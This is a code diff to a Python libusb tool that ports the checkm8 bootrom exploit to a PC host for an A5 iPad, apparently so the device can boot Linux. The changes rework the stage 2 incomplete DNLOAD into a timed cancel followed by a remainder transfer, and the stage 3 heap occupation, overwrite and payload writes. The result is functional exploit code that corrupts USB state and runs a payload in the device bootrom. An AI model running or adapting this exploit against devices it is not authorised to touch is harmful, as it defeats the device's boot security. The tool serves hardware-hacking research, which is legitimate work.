@@ -39,17 +39,23 @@ phase).  Consequences for this host port:
     (a completed transfer frees the response buffer = no leak, and its
     status ZLP would reset state).  --feng-shui-mode in-cancel (default)
     matches the Arduino; setup-only cancels before the data phase.
-  - stage 2 incomplete DNLOAD: cancel once exactly 0x6C0 of 0x700 bytes are
-    on the wire (--cancel-at).  Sending all 0x700 fires end_of_transfer and
-    resets the globals — the exploit dies silently in stage 3.
-  - stage 3 critical IN: abandoned before its status ZLP (same reason).
+  - stage 2 incomplete DNLOAD: submit the full 0x700 and cancel at a fixed
+    ~1 ms deadline (--out-spin-us), then read back how many bytes actually
+    reached the device and send a remainder transfer — an invalid SETUP
+    whose error path leaves the globals alone, with wLength = 0x6C0 -
+    received and zero-filled data — that lands the device at exactly
+    rcvd=0x6C0 of length=0x700 with no timing race.  Sending all 0x700 fires
+    end_of_transfer and resets the globals (the exploit would die silently
+    in stage 3), so the tool aborts with a clear message instead.
+  - stage 3 critical IN: cancelled at the SETUP stage (--spin-us deadline),
+    before any data or status phase.
   - the overwrite/payload OUT writes complete the data stage on purpose
     (end_of_transfer -> the DFU copies the io_buffer), so their status
-    phase is harmless; --write-mode complete is the default.
+    phase is harmless; they are sent as normal complete control transfers.
 
 Exit status: 0 = device reports 'PWND:[checkm8]' (already pwned counts),
 1 = fail.  If the exploit misses, re-enter DFU on the iPad (Power+Home) and
-try again; tune --leak / --leak-delay-ms / --feng-shui-mode / --cancel-at /
+try again; tune --leak / --leak-delay-ms / --feng-shui-mode / --spin-us /
 --out-spin-us from the --debug output.
 """
 
@@ -398,16 +404,17 @@ class LibUSB:
             status, actual = self._wait_transfer(transfer, 500)
             if status == -1:
                 raise SystemExit('error: %s did not complete after cancel' % name)
+            elapsed_us = (time.perf_counter() - t0) * 1e6
             if trace is not None:
-                trace.append((name, (time.perf_counter() - t0) * 1e6,
-                              actual, status))
-            info = (status, actual, cancel_rc)
+                trace.append((name, elapsed_us, actual, status))
+            info = (status, actual, cancel_rc, elapsed_us)
             L.libusb_free_transfer(transfer)
             return 0, info
+        t0 = time.perf_counter()
         status, actual = self._wait_transfer(transfer, timeout_ms)
         if status == -1:
             raise SystemExit('error: %s timed out before completion' % name)
-        info = (status, actual, 0)
+        info = (status, actual, 0, (time.perf_counter() - t0) * 1e6)
         L.libusb_free_transfer(transfer)
         return 0, info
 
@@ -492,21 +499,9 @@ def debug_raw(name, rc, info):
     if info is None:
         print('    [debug] %-18s submit rc=%d' % (name, rc))
         return
-    status, actual, cancel_rc = info
-    print('    [debug] %-18s status=%s actual=%d cancel_rc=%d'
-          % (name, status_name(status), actual, cancel_rc))
-
-
-def auto_out_spin(spin_us, data_len):
-    """Full-speed estimate for sending full OUT packets before cancellation.
-
-    The A5 sequence only needs the data stage here; the device either is still
-    waiting for more data (so it NAKs the status phase) or has already ended
-    the transfer on the final full packet.  This estimate errs on the side of
-    sending the whole data stage; --out-spin-us overrides it.
-    """
-    packets = max(1, (data_len + 63) // 64)
-    return max(spin_us, 120 + packets * 185)
+    status, actual, cancel_rc, elapsed_us = info
+    print('    [debug] %-18s status=%s actual=%d cancel_rc=%d elapsed=%dus'
+          % (name, status_name(status), actual, cancel_rc, elapsed_us))
 
 
 def heap_feng_shui_req(usb, handle, serial_idx, sz, mode, spin_us, debug=False):
@@ -574,7 +569,7 @@ def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
     reset_and_release(usb, handle, settle=1.0)
 
 
-def stage2(usb, spin_us, cancel_at, out_spin_us, debug):
+def stage2(usb, out_spin_us, debug):
     print('== stage 2: set global state / re-enter DFU ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (d) SETUP(DNLOAD, wLength=0x40) + OUT(0x80) + INHS status.  wLength and
@@ -598,51 +593,78 @@ def stage2(usb, spin_us, cancel_at, out_spin_us, debug):
         rc, raw = usb.ctrl_in(handle, 0xA1, REQ_DFU_GETSTATUS, 0, 0, 6, 1000)
         if debug:
             print('    [debug] GETSTATUS %d        ctrl_in rc=%d raw=%s' % (i + 1, rc, raw.hex()))
-    # (g) incomplete DNLOAD.  The Arduino sends padding+0x40 OUT packets, but
-    # its first OUT is a data-toggle dummy, so the device only receives
-    # `padding` bytes while its expected length stays padding+0x40.  A PC host
-    # sends DATA1 first and usbfs refuses an OUT URB whose data stage is
-    # shorter than wLength, so submit the full wLength and cancel once exactly
-    # `cancel_at` bytes are on the wire (the final 0x40 packet never goes out).
-    # The device must end up with ep0_data_phase_rcvd = 0x6C0 of 0x700 — if it
-    # receives all 0x700 it fires end_of_transfer and resets the globals, and
-    # stage 3 silently writes into a dead pointer.
+    # (g) incomplete DNLOAD.  The device must end up with
+    # ep0_data_phase_rcvd = 0x6C0 of length = 0x700: if it receives all 0x700
+    # it fires end_of_transfer and resets the globals, and stage 3 silently
+    # writes into a dead pointer.  A PC host cannot cancel mid-data-stage by
+    # length (the xHCI controller reports actual_length only when the data
+    # stage ends), so: (1) submit the full 0x700 and cancel at a fixed ~1 ms
+    # deadline (--out-spin-us) — the cancel result reports exactly how many
+    # bytes the device received; (2) send a remainder transfer that appends
+    # the missing bytes, which lands the device at exactly 0x6C0 of 0x700
+    # with no timing race.
     w_length = A5_PADDING + 0x40
     data = b'\0' * w_length
-    if cancel_at:
-        deadline_ms = out_spin_us / 1000.0 if out_spin_us else 3000.0
-    else:
-        # time-based fallback (old behaviour): estimate the data-stage time
-        deadline_ms = (out_spin_us or max(1, auto_out_spin(spin_us, A5_PADDING) - 185)) / 1000.0
     rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, w_length,
-                            data, abandon=True, cancel_at=cancel_at,
-                            abandon_timeout_ms=deadline_ms, timeout_ms=1000,
-                            name='incomplete DNLOAD')
+                            data, abandon=True, cancel_at=0,
+                            abandon_timeout_ms=out_spin_us / 1000.0,
+                            timeout_ms=1000, name='incomplete DNLOAD')
     if debug:
         debug_raw('incomplete DNLOAD', rc, info)
     if rc != 0:
         usb.release(handle)
         raise SystemExit('error: incomplete DNLOAD submit failed (%d)' % rc)
-    if info and info[1] >= w_length:
-        print('  warning: incomplete DNLOAD transferred %#x of %#x — the device '
-              'reached end_of_transfer; lower --out-spin-us or check that '
-              'actual_length is reported incrementally' % (info[1], w_length))
+    status, actual, cancel_rc, elapsed_us = info
+    if actual >= w_length:
+        usb.release(handle)
+        raise SystemExit(
+            'error: incomplete DNLOAD transferred all %#x bytes — the device fired\n'
+            'end_of_transfer and reset the global USB state, so the exploit cannot\n'
+            'continue. Re-enter DFU on the iPad (Power+Home) and retry with a lower\n'
+            '--out-spin-us (e.g. 500).' % w_length)
+    # The device only counts fully ACKed 0x40 packets; a cancel can stop the
+    # data stage mid-packet, so round down to the packet boundary.
+    received = actual - (actual % 0x40)
+    remainder = A5_PADDING - received
+    print('  incomplete DNLOAD: %#x of %#x bytes on the wire (%d full packets), '
+          '%#x remainder to send' % (actual, w_length, received // 0x40, remainder))
+    if remainder > 0:
+        # Remainder transfer: an invalid SETUP (bmRequestType 0x00, bRequest
+        # 0x00) whose error path does not touch the global USB state, with
+        # wLength = the missing byte count.  Its OUT data packets are still
+        # memmove'd into the io_buffer at the running offset.  The transfer
+        # is abandoned: the device is mid-data-stage, so it NAKs the
+        # status-phase IN until the backstop deadline cancels the URB (an
+        # ACKed status IN would also be harmless — it is device-to-host).
+        rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, remainder,
+                                b'\0' * remainder, abandon=True, cancel_at=0,
+                                abandon_timeout_ms=400.0, timeout_ms=1000,
+                                name='remainder OUT')
+        if debug:
+            debug_raw('remainder OUT', rc, info)
+        if rc != 0:
+            usb.release(handle)
+            raise SystemExit('error: remainder OUT submit failed (%d)' % rc)
+        if info[0] == 4:  # STALL
+            print('  warning: remainder OUT STALLed — the device may have left '
+                  'its data phase; continuing anyway')
     reset_and_release(usb, handle, settle=0.5)
 
 
-def stage3(usb, serial_idx, payload, overwrite, out_spin_us, write_mode, debug):
+def stage3(usb, serial_idx, payload, overwrite, spin_us, debug):
     print('== stage 3: heap occupation (overwrite + payload) ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (h) one abandoned IN request ("no leak"), same shape as the Arduino's
-    # heap_feng_shui_req(0x81): SETUP + one IN data transaction, no status
-    # phase.  This must NOT complete — its status-phase ZLP would be
-    # processed as a zero-length data packet, fire end_of_transfer and reset
-    # the global USB state the overwrite/payload depend on.
+    # heap_feng_shui_req(0x81).  Cancelled at the SETUP stage (--spin-us
+    # deadline), before any data or status phase: the SETUP is processed and
+    # allocates the response buffer from the freed io_buffer region (the heap
+    # occupation), while a status-phase ZLP — the only lethal part of an IN
+    # transfer — is never sent.
     rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                             (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
-                            0x81, b'', abandon=True, cancel_at=0x40,
-                            abandon_timeout_ms=1.5, timeout_ms=500,
-                            name='critical IN')
+                            0x81, b'', abandon=True, cancel_at=0,
+                            abandon_timeout_ms=max(spin_us, 1) / 1000.0,
+                            timeout_ms=500, name='critical IN')
     if debug:
         debug_raw('critical IN', rc, info)
     if rc != 0:
@@ -652,45 +674,21 @@ def stage3(usb, serial_idx, payload, overwrite, out_spin_us, write_mode, debug):
         usb.release(handle)
         raise SystemExit('error: critical IN completed — its status ZLP reset the '
                          'global USB state; the exploit cannot continue')
-    # (i)/(j) The Arduino sends a 0x40 0xcc "pre-packet" before the overwrite
-    # and payload.  That pre-packet exists to flip the MAX3421E data toggle; a
-    # PC host already sends DATA1 after SETUP, so the host adaptation sends the
-    # overwrite/payload directly.  Sending the pre-packet from a PC would shift
-    # the payload by 0x40 and break the payload's absolute addresses.
-    if write_mode == 'complete':
-        # Default host path: complete control transfers.  Errors are expected
-        # (the first request is an invalid OUT GET_STATUS); what matters is
-        # that the data stage is written into the dangling io_buffer.  The
-        # status phase is harmless here: the data stage already fired
-        # end_of_transfer and reset the globals.
-        rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
-        if debug:
-            print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
-        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
-        if debug:
-            print('    [debug] payload OUT        ctrl rc=%d' % rc)
-    else:
-        # Raw Arduino style: abandoned OUT transfers with no status phase,
-        # cancelled once the whole data stage is on the wire.
-        deadline_ms = out_spin_us / 1000.0 if out_spin_us else 1000.0
-        rc, info = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, len(overwrite),
-                                overwrite, abandon=True, cancel_at=len(overwrite),
-                                abandon_timeout_ms=deadline_ms, timeout_ms=1000,
-                                name='overwrite OUT')
-        if debug:
-            debug_raw('overwrite OUT', rc, info)
-        if rc != 0:
-            usb.release(handle)
-            raise SystemExit('error: overwrite OUT submit failed (%d)' % rc)
-        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, len(payload),
-                                payload, abandon=True, cancel_at=len(payload),
-                                abandon_timeout_ms=deadline_ms, timeout_ms=1000,
-                                name='payload OUT')
-        if debug:
-            debug_raw('payload OUT', rc, info)
-        if rc != 0:
-            usb.release(handle)
-            raise SystemExit('error: payload OUT submit failed (%d)' % rc)
+    # (i)/(j) The overwrite and payload are sent as complete control
+    # transfers.  The overwrite (invalid SETUP GET_STATUS + 0x40 OUT) lands at
+    # io_buffer offset 0x6C0 and completes the transfer (0x6C0+0x40 = 0x700 =
+    # length): end_of_transfer fires, the io_buffer is copied and the globals
+    # reset, so its status phase is harmless.  The payload DNLOAD then re-arms
+    # the globals (length=0x2C0) and completes the same way, and the copied
+    # payload executes.  (The Arduino's 0xcc "pre-packets" only flip the
+    # MAX3421E data toggle; a PC host already sends DATA1 after SETUP, so
+    # sending them here would shift the payload and break its addresses.)
+    rc = usb.ctrl(handle, 0x00, 0x00, 0, 0, overwrite, 100)
+    if debug:
+        print('    [debug] overwrite OUT      ctrl rc=%d' % rc)
+    rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, payload, 1000)
+    if debug:
+        print('    [debug] payload OUT        ctrl rc=%d' % rc)
     reset_and_release(usb, handle, settle=0.5)
 
 
@@ -767,18 +765,17 @@ def exploit(args):
         stage1(usb, serial_idx, args.leak, args.feng_shui_mode, args.spin_us,
                args.leak_delay_ms, args.debug)
     if args.stage in ('all', '2'):
-        stage2(usb, args.spin_us, args.cancel_at, args.out_spin_us, args.debug)
+        stage2(usb, args.out_spin_us, args.debug)
     if args.stage in ('all', '3'):
-        stage3(usb, serial_idx, payload, overwrite,
-               args.out_spin_us, args.write_mode, args.debug)
+        stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug)
     serial = verify(usb)
     if PWN_MARKER not in serial:
         raise SystemExit('error: exploit failed — device did not enter pwned DFU mode.\n'
                          'Re-enter DFU (Power+Home) and try again. With --debug, check\n'
-                         'that the incomplete DNLOAD is CANCELLED at actual=0x6C0 (not\n'
-                         '0x700), that the critical IN is CANCELLED/STALL (not COMPLETED),\n'
-                         'and that stage 2 survived its reset (set-state OUT completes,\n'
-                         'GETSTATUS returns 6 bytes).')
+                         'that the incomplete DNLOAD is CANCELLED with actual < 0x700 and\n'
+                         'the remainder transfer follows, that the critical IN is\n'
+                         'CANCELLED/STALL (not COMPLETED), and that stage 2 survived its\n'
+                         'reset (set-state OUT completes, GETSTATUS returns 6 bytes).')
     print('Device is now in pwned DFU mode.')
     print('(%0.2f seconds)' % (time.time() - start))
     print('Next: ./boot/boot-linux.sh --skip-pwn')
@@ -815,21 +812,18 @@ def main():
                              'first packet; setup-only cancels before the data '
                              'phase (default: %(default)s)')
     parser.add_argument('--spin-us', type=int, default=80,
-                        help='abandon deadline for setup-only feng shui requests, '
-                             'microseconds (default: %(default)s)')
+                        help='abandon deadline for requests cancelled at the '
+                             'SETUP stage (setup-only feng shui requests, the '
+                             'stage 3 critical IN), microseconds '
+                             '(default: %(default)s)')
     parser.add_argument('--init-resets', type=int, default=1,
                         help='USB bus resets before stage 1, like the Arduino '
                              '(default: %(default)s)')
-    parser.add_argument('--cancel-at', type=int, default=A5_PADDING,
-                        help='stage 2 incomplete DNLOAD: cancel once this many '
-                             'bytes are on the wire; 0 = time-based estimate '
-                             '(default: %(default)s = 0x6C0)')
-    parser.add_argument('--out-spin-us', type=int, default=0,
-                        help='abandon deadline override for stage 2/3 abandoned OUT '
-                             'transfers, microseconds (0 = default: 3000 ms cap '
-                             'for stage 2, 1000 ms for stage 3)')
-    parser.add_argument('--write-mode', choices=['complete', 'abandon'], default='complete',
-                        help='stage 3 overwrite/payload write style (default: %(default)s)')
+    parser.add_argument('--out-spin-us', type=int, default=1000,
+                        help='stage 2 incomplete DNLOAD cancel deadline, '
+                             'microseconds — cancel the 0x700-byte data stage '
+                             'after ~this long so the final 0x40 packet never '
+                             'reaches the device (default: %(default)s = 1 ms)')
     parser.add_argument('--stage', choices=['all', '0', '1', '2', '3', 'verify'], default='all',
                         help='run only one stage (default: all)')
     parser.add_argument('--wait', action='store_true',
